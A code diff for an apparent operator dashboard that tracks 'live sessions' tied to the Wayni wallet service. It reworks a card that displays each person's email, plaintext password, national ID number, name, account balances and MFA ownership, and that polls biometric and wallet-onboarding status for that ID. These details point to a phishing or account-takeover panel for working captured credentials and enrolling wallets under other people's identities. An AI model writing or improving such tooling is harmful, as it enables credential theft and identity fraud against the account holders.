@@ -1375,18 +1375,19 @@ const LimitBar = ({ label, used, total }: { label: string; used: number; total: 
 };
 
 // ══════════════════════════════════════════
-// SESSION ROW (compact) with onboarding tracking
+// WAYNI ONBOARDING CARD — Dedicated tracking
 // ══════════════════════════════════════════
-const SessionRow = ({ session }: { session: LiveSession }) => {
+const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
   const [copied, setCopied] = useState("");
   const [bioInfo, setBioInfo] = useState<Record<string, unknown> | null>(null);
   const [walletInfo, setWalletInfo] = useState<Record<string, unknown> | null>(null);
-  const [bioLoading, setBioLoading] = useState(false);
-  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
-  const time = new Date(session.created_at);
-  const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+  const [loading, setLoading] = useState(false);
+  const [lastCheck, setLastCheck] = useState<string>("");
 
-  // Parse otp_code — supports both `key:value` and `key=value` separators
+  const time = new Date(session.created_at);
+  const timeStr = time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" }) + " " + time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+
+  // Parse otp_code
   const otpParts: Record<string, string> = {};
   if (session.otp_code) {
     session.otp_code.split("|").forEach((part) => {
@@ -1408,34 +1409,52 @@ const SessionRow = ({ session }: { session: LiveSession }) => {
   const userName = otpParts.name || "";
   const userUuid = otpParts.uuid || "";
 
-  // Is this an onboarding session?
-  const isOnboarding = ["verify_dni_submitted", "verify_dni_success", "verify_dni_error", "address_submitted", "address_saved", "address_error", "biometric_started", "biometric_finished"].includes(session.status);
+  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
 
-  // Auto-fetch biometric + wallet info for onboarding sessions
+  // Determine process stage
+  const getProcessStage = () => {
+    const s = session.status;
+    if (s === "verify_dni_submitted") return { label: "DNI Enviado", icon: "📋", color: "text-yellow-400 bg-yellow-500/10" };
+    if (s === "verify_dni_success") return { label: "DNI Validado ✓", icon: "📋", color: "text-green-400 bg-green-500/10" };
+    if (s === "verify_dni_error") return { label: "DNI Error ✗", icon: "📋", color: "text-red-400 bg-red-500/10" };
+    if (s === "address_submitted") return { label: "Endereço Enviado", icon: "📍", color: "text-yellow-400 bg-yellow-500/10" };
+    if (s === "address_saved") return { label: "Endereço Salvo ✓", icon: "📍", color: "text-green-400 bg-green-500/10" };
+    if (s === "address_error") return { label: "Endereço Error ✗", icon: "📍", color: "text-red-400 bg-red-500/10" };
+    if (s === "biometric_started") return { label: "Biometria Iniciada", icon: "🔬", color: "text-amber-400 bg-amber-500/10" };
+    if (s === "biometric_finished") return { label: "Biometria Concluída ✓", icon: "🔬", color: "text-green-400 bg-green-500/10" };
+    if (s === "biometric_error") return { label: "Biometria Error ✗", icon: "🔬", color: "text-red-400 bg-red-500/10" };
+    return { label: cfg.label, icon: "❓", color: cfg.color };
+  };
+
+  const stage = getProcessStage();
+
+  const fetchInfo = async () => {
+    if (!dni) return;
+    setLoading(true);
+    try {
+      const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+      const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+      const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
+
+      const [bioRes, walletRes] = await Promise.allSettled([
+        fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_biometric_info", identity_number: dni }) }).then(r => r.json()),
+        fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_wallet_status", identity_number: dni }) }).then(r => r.json()),
+      ]);
+
+      if (bioRes.status === "fulfilled" && bioRes.value?.success) setBioInfo(bioRes.value);
+      if (walletRes.status === "fulfilled") setWalletInfo(walletRes.value);
+      setLastCheck(new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }));
+    } catch { /* ignore */ }
+    setLoading(false);
+  };
+
+  // Auto-fetch on mount and poll every 3 minutes
   useEffect(() => {
-    if (!dni || !isOnboarding) return;
-    const fetchInfo = async () => {
-      setBioLoading(true);
-      try {
-        const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
-        const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
-        const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
-
-        const [bioRes, walletRes] = await Promise.allSettled([
-          fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_biometric_info", identity_number: dni }) }).then(r => r.json()),
-          fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_wallet_status", identity_number: dni }) }).then(r => r.json()),
-        ]);
-
-        if (bioRes.status === "fulfilled" && bioRes.value?.success) setBioInfo(bioRes.value);
-        if (walletRes.status === "fulfilled") setWalletInfo(walletRes.value);
-      } catch { /* ignore */ }
-      setBioLoading(false);
-    };
+    if (!dni) return;
     fetchInfo();
-    // Poll every 5 minutes
-    const interval = setInterval(fetchInfo, 5 * 60 * 1000);
+    const interval = setInterval(fetchInfo, 3 * 60 * 1000);
     return () => clearInterval(interval);
-  }, [dni, isOnboarding]);
+  }, [dni]);
 
   const copyText = (text: string, label: string) => {
     navigator.clipboard.writeText(text);
@@ -1446,17 +1465,179 @@ const SessionRow = ({ session }: { session: LiveSession }) => {
   const BioCheck = ({ ok, label }: { ok: string | boolean; label: string }) => {
     const isDone = ok === "true" || ok === true;
     return (
-      <span className={`text-[8px] px-1.5 py-0.5 rounded font-semibold ${isDone ? "bg-green-500/15 text-green-400" : "bg-red-500/15 text-red-400"}`}>
+      <span className={`text-[9px] px-2 py-1 rounded-lg font-semibold ${isDone ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
         {isDone ? "✓" : "✗"} {label}
       </span>
     );
+  };
+
+  // Determine overall validation progress
+  const getValidationProgress = () => {
+    const steps = [];
+    // Step 1: DNI
+    const dniOk = ["verify_dni_success", "address_submitted", "address_saved", "biometric_started", "biometric_finished"].includes(session.status);
+    steps.push({ label: "DNI", done: dniOk, error: session.status === "verify_dni_error" });
+    // Step 2: Address
+    const addressOk = ["address_saved", "biometric_started", "biometric_finished"].includes(session.status);
+    steps.push({ label: "Endereço", done: addressOk, error: session.status === "address_error" });
+    // Step 3: Biometric
+    const bioOk = session.status === "biometric_finished" || (bioInfo && bioInfo.selfie === "true" && bioInfo.dniFront === "true" && bioInfo.dniBack === "true");
+    steps.push({ label: "Biometria", done: !!bioOk, error: session.status === "biometric_error" });
+    // Step 4: Wallet
+    const walletOk = walletInfo && walletInfo.status === "ACTIVE";
+    steps.push({ label: "Wallet", done: !!walletOk });
+    return steps;
+  };
+
+  const progress = getValidationProgress();
+
+  return (
+    <div className="rounded-xl border border-border bg-card overflow-hidden">
+      {/* Header */}
+      <div className="px-4 py-3 flex items-center justify-between gap-3 border-b border-border/50">
+        <div className="flex items-center gap-3 min-w-0">
+          <div className="h-8 w-8 rounded-lg bg-green-500/10 flex items-center justify-center shrink-0">
+            <span className="text-sm">{stage.icon}</span>
+          </div>
+          <div className="min-w-0">
+            <div className="flex items-center gap-2 flex-wrap">
+              <span className="text-[12px] font-bold text-foreground truncate">{session.email || "—"}</span>
+              <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${stage.color}`}>{stage.label}</span>
+            </div>
+            <div className="flex items-center gap-2 text-[9px] text-muted-foreground mt-0.5">
+              <span>{timeStr}</span>
+              {session.country && <span>• {session.country}{session.city ? ` ${session.city}` : ""}</span>}
+              {session.operator_code && session.operator_code !== "master" && (
+                <span className="font-mono px-1 py-0.5 rounded bg-purple-500/10 text-purple-400">{session.operator_code}</span>
+              )}
+            </div>
+          </div>
+        </div>
+        <button onClick={fetchInfo} disabled={loading} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors shrink-0">
+          <RefreshCw size={12} className={loading ? "animate-spin" : ""} />
+        </button>
+      </div>
+
+      {/* Progress bar */}
+      <div className="px-4 py-2.5 flex items-center gap-1.5">
+        {progress.map((step, i) => (
+          <div key={step.label} className="flex items-center gap-1.5 flex-1">
+            <div className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[9px] font-bold flex-1 justify-center ${
+              step.done ? "bg-green-500/10 text-green-400 border border-green-500/20" :
+              step.error ? "bg-red-500/10 text-red-400 border border-red-500/20" :
+              "bg-secondary text-muted-foreground border border-border"
+            }`}>
+              {step.done ? "✓" : step.error ? "✗" : "○"} {step.label}
+            </div>
+            {i < progress.length - 1 && <span className="text-muted-foreground/30 text-[8px]">→</span>}
+          </div>
+        ))}
+      </div>
+
+      {/* Data */}
+      <div className="px-4 pb-3 space-y-2">
+        {/* User info */}
+        <div className="flex items-center gap-3 flex-wrap">
+          {dni && (
+            <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 hover:opacity-80">
+              <span className="text-[10px] font-semibold text-indigo-400">📋 DNI: {dni}</span>
+              {copied === "dni" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+          {userName && <span className="text-[10px] text-foreground font-medium">👤 {userName}</span>}
+          {userUuid && (
+            <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
+              <span className="text-[9px] font-mono text-muted-foreground">UUID: {userUuid.slice(0, 12)}...</span>
+              {copied === "uuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+          {session.password && (
+            <button onClick={() => copyText(session.password!, "spwd")} className="flex items-center gap-1 hover:opacity-80">
+              <Lock size={8} className="text-yellow-400" />
+              <span className="text-[10px] font-mono text-yellow-400">{session.password}</span>
+              {copied === "spwd" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+        </div>
+
+        {/* Biometric details */}
+        {bioInfo && (
+          <div className="flex items-center gap-2 flex-wrap">
+            <span className="text-[9px] font-bold text-muted-foreground">Biometria:</span>
+            <BioCheck ok={bioInfo.selfie as string} label="Selfie" />
+            <BioCheck ok={bioInfo.dniFront as string} label="DNI Frente" />
+            <BioCheck ok={bioInfo.dniBack as string} label="DNI Dorso" />
+          </div>
+        )}
+
+        {/* Wallet status */}
+        {walletInfo && (
+          <div className="flex items-center gap-2 flex-wrap">
+            <span className="text-[9px] font-bold text-muted-foreground">Wallet:</span>
+            <span className={`text-[10px] px-2 py-0.5 rounded-lg font-bold ${
+              walletInfo.status === "ACTIVE" ? "bg-green-500/15 text-green-400 border border-green-500/20" :
+              walletInfo.uuid ? "bg-amber-500/15 text-amber-400 border border-amber-500/20" :
+              "bg-red-500/15 text-red-400 border border-red-500/20"
+            }`}>
+              💳 {walletInfo.status ? String(walletInfo.status) : walletInfo.errors ? "NO ENCONTRADA" : "PENDIENTE"}
+            </span>
+            {walletInfo.uuid && (
+              <button onClick={() => copyText(String(walletInfo.uuid), "wuuid")} className="flex items-center gap-1 hover:opacity-80">
+                <span className="text-[9px] font-mono text-muted-foreground">UUID: {String(walletInfo.uuid).slice(0, 12)}...</span>
+                {copied === "wuuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+              </button>
+            )}
+          </div>
+        )}
+
+        {/* Last check */}
+        {lastCheck && (
+          <span className="text-[8px] text-muted-foreground/50">Última consulta: {lastCheck}</span>
+        )}
+
+        {!dni && <span className="text-[9px] text-muted-foreground">Sem DNI registrado nesta sessão</span>}
+      </div>
+    </div>
+  );
+};
+
+// ══════════════════════════════════════════
+// SESSION ROW (compact) — NO onboarding tracking
+// ══════════════════════════════════════════
+const SessionRow = ({ session }: { session: LiveSession }) => {
+  const [copied, setCopied] = useState("");
+  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
+  const time = new Date(session.created_at);
+  const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+
+  // Parse otp_code
+  const otpParts: Record<string, string> = {};
+  if (session.otp_code) {
+    session.otp_code.split("|").forEach((part) => {
+      const colonIdx = part.indexOf(":");
+      const eqIdx = part.indexOf("=");
+      let sep = -1;
+      if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
+      else if (colonIdx > 0) sep = colonIdx;
+      else if (eqIdx > 0) sep = eqIdx;
+      if (sep > 0) {
+        const k = part.slice(0, sep).trim();
+        const v = part.slice(sep + 1).trim();
+        if (k) otpParts[k] = v;
+      }
+    });
+  }
+
+  const copyText = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(label);
+    setTimeout(() => setCopied(""), 1500);
   };
 
   return (
     <div className={`rounded-lg border bg-card px-3 py-2 transition-all hover:bg-card/80 ${
       session.status === "completed" ? "border-green-500/20" :
       session.status.includes("error") || session.status.includes("wrong") ? "border-red-500/20" :
-      isOnboarding ? "border-purple-500/20" :
       "border-border"
     }`}>
       {/* Main line */}
@@ -1497,68 +1678,6 @@ const SessionRow = ({ session }: { session: LiveSession }) => {
           {otpParts.balance_ars && <span className="text-[9px] text-emerald-400">💰 {otpParts.balance_ars}</span>}
           {otpParts.balance_usd && <span className="text-[9px] text-blue-400">💵 {otpParts.balance_usd}</span>}
           {otpParts.mfa_type && <span className={`text-[9px] ${otpParts.mfa_type === "client_own" ? "text-amber-400" : "text-purple-400"}`}>{otpParts.mfa_type === "client_own" ? "🔒 MFA Cliente" : "🔑 MFA Nosso"}</span>}
-        </div>
-      )}
-
-      {/* Onboarding tracking row */}
-      {isOnboarding && dni && (
-        <div className="mt-1.5 pt-1.5 border-t border-border/50 space-y-1">
-          {/* DNI + Name */}
-          <div className="flex items-center gap-2 flex-wrap">
-            <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 hover:opacity-80">
-              <span className="text-[9px] font-semibold text-indigo-400">📋 DNI: {dni}</span>
-              {copied === "dni" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
-            </button>
-            {userName && <span className="text-[9px] text-foreground font-medium">👤 {userName}</span>}
-            {userUuid && (
-              <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
-                <span className="text-[8px] font-mono text-muted-foreground">UUID: {userUuid.slice(0, 8)}...</span>
-                {copied === "uuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
-              </button>
-            )}
-          </div>
-
-          {/* Biometric + Wallet status */}
-          {bioLoading && !bioInfo && (
-            <div className="flex items-center gap-1.5">
-              <RefreshCw size={9} className="animate-spin text-muted-foreground" />
-              <span className="text-[8px] text-muted-foreground">Consultando biometria e wallet...</span>
-            </div>
-          )}
-
-          {bioInfo && (
-            <div className="flex items-center gap-2 flex-wrap">
-              <span className={`text-[8px] px-1.5 py-0.5 rounded font-bold ${
-                bioInfo.status === "complete" ? "bg-green-500/15 text-green-400" :
-                bioInfo.status === "incomplete" ? "bg-amber-500/15 text-amber-400" :
-                "bg-red-500/15 text-red-400"
-              }`}>
-                🔬 {String(bioInfo.status || "?").toUpperCase()}
-              </span>
-              <BioCheck ok={bioInfo.selfie as string} label="Selfie" />
-              <BioCheck ok={bioInfo.dniFront as string} label="DNI Frente" />
-              <BioCheck ok={bioInfo.dniBack as string} label="DNI Dorso" />
-              {bioInfo.firstName && <span className="text-[8px] text-muted-foreground">{String(bioInfo.firstName)} {String(bioInfo.lastName || "")}</span>}
-            </div>
-          )}
-
-          {walletInfo && (
-            <div className="flex items-center gap-2 flex-wrap">
-              <span className={`text-[8px] px-1.5 py-0.5 rounded font-bold ${
-                walletInfo.status === "ACTIVE" ? "bg-green-500/15 text-green-400" :
-                walletInfo.uuid ? "bg-amber-500/15 text-amber-400" :
-                "bg-red-500/15 text-red-400"
-              }`}>
-                💳 Wallet: {walletInfo.status ? String(walletInfo.status) : walletInfo.errors ? "NO ENCONTRADA" : "?"}
-              </span>
-              {walletInfo.uuid && (
-                <button onClick={() => copyText(String(walletInfo.uuid), "wuuid")} className="flex items-center gap-1 hover:opacity-80">
-                  <span className="text-[8px] font-mono text-muted-foreground">{String(walletInfo.uuid).slice(0, 8)}...</span>
-                  {copied === "wuuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
-                </button>
-              )}
-            </div>
-          )}
         </div>
       )}
     </div>
